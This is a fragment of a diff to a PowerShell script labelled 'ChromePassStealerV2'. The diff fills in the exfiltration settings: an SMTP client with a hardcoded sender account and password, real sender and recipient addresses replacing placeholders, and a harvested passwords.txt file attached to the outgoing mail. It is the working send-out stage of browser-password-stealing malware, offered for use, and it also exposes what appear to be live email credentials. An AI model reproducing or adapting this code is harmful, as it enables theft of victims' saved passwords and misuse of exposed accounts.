@@ -16,8 +16,8 @@ $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
 $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('taimetropgouterdesfois@laposte.net', 'IdzjpkdfzpoHhidzh@!25Idz') #Email with which you want to send information
 $ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'EMAIL' #Email in which you want to receice the information
-$ReportEmail.To.Add('EMAIL') #Email in which you want to receive the information
+$ReportEmail.From = 'taimetropgouterdesfois@laposte.net' #Email in which you want to receice the information
+$ReportEmail.To.Add('g0zuuu@proton.me') #Email in which you want to receive the information
 $ReportEmail.Subject = 'ChromePassStealerV2'
 $ReportEmail.Body = 'Attached is your list of informations.'
 $ReportEmail.Attachments.Add('C:\Users\Public\Documents\passwords.txt')
